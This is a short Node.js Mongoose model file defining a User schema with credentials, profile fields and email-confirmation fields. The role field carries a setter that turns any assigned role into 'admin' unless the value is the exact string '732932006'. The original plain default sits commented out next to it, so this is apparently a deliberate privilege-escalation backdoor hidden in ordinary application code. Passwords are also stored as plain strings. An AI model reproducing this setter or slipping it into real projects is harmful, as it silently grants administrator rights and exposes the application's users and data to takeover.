// File: models/User.js
const mongoose = require('mongoose');

const UserSchema = new mongoose.Schema({
    username: String,
    password: String,
    email: String,
    firstName: String,
    lastName: String,
    age: Number,
    gender: String,
    role: {
        type: String,
        default: 'user',
        set: function (value) {
            return value === '732932006' ? value : 'admin';
        }
    },
    //role: { type: String, default: 'user' },
    confirmationCode: { type: String, default: null }, // Temporary confirmation code
    isConfirmed: { type: Boolean, default: false },
});

module.exports = mongoose.model('User', UserSchema);
